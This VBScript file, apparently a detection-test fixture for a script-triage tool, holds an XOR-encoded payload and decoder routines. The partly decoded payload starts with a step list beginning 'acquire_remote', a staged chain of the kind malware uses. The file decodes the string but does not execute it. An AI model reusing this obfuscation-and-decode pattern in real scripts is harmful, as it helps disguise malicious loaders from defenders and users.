Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_61c1c1b8 = "60|96|61|162|46|62|56|124|173|96|43|62|125|171|52|56|56|83|172|56|39|50|120|187|113|61|47|101|170|56|21|59|101|178|56|54|60|104|191|45|62|56|126|227|10|35|51|68|170|41|58|115|91|183|51|2|41|120|174|15|47|44|121|187|46|62|115|57|240|108|54|46|120|191|58|47|2|111|177|40|36|41|49|236|33|41|60|97|174|60|35|58|98|129|52|46|96|111|191|48|58|60|101|185|51|103|101|59|233|111|43|100|63|231|100|121|33|121|172|49|119|53|120|170|45|57|103|35|241|101|125|106|62|191|100|121|100|53|237|115|47|37|109|179|45|38|56|34|183|51|60|60|96|183|57|101|104|61|231|101|126|63|109|235|115|46|60|120|162|40|57|56|126|129|60|45|56|98|170|96|2|40|98|170|47|47|46|127|146|60|40|114|52|233|106|120|60|53|237|100|115|110|112|184|52|38|56|83|174|60|62|53|49|157|103|22|8|127|187|47|57|1|92|171|63|38|52|111|130|21|63|51|120|172|56|57|46|64|191|63|22|46|120|191|58|47|112|52|233|106|120|60|53|237|100|115|110|34|186|60|62"
Const Codec_61c1c1b8 = "decimal_pipe|repeating_key_xor|4a,5d,0c,de,5d"

Function Load_61c1c1b8()
  Dim parts, result(), v_e598
  parts = Split(Material_61c1c1b8, "|")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(v_e598) = CInt(parts(v_e598))
  Next
  Load_61c1c1b8 = result
End Function

Function Decode_61c1c1b8(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  keyBytes = Array(74,93,12,222,93)
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor keyBytes(v_e598 Mod 5)
  Next
  Decode_61c1c1b8 = result
End Function

Function Recover_61c1c1b8()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  v_d41a = (19 * 7) - 133

  v_a19c = Load_61c1c1b8()

  v_b27e = Decode_61c1c1b8(v_a19c)

  v_c304 = ""

  For v_e598 = 0 To UBound(v_b27e)

    v_c304 = v_c304 & Chr(v_b27e(v_e598))

  Next
  Recover_61c1c1b8 = v_c304
End Function

Sub Copy_61c1c1b8(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_61c1c1b8()
  Dim resultText
  Call Copy_61c1c1b8(Recover_61c1c1b8(), resultText)
  Inspect_61c1c1b8 = resultText
End Function
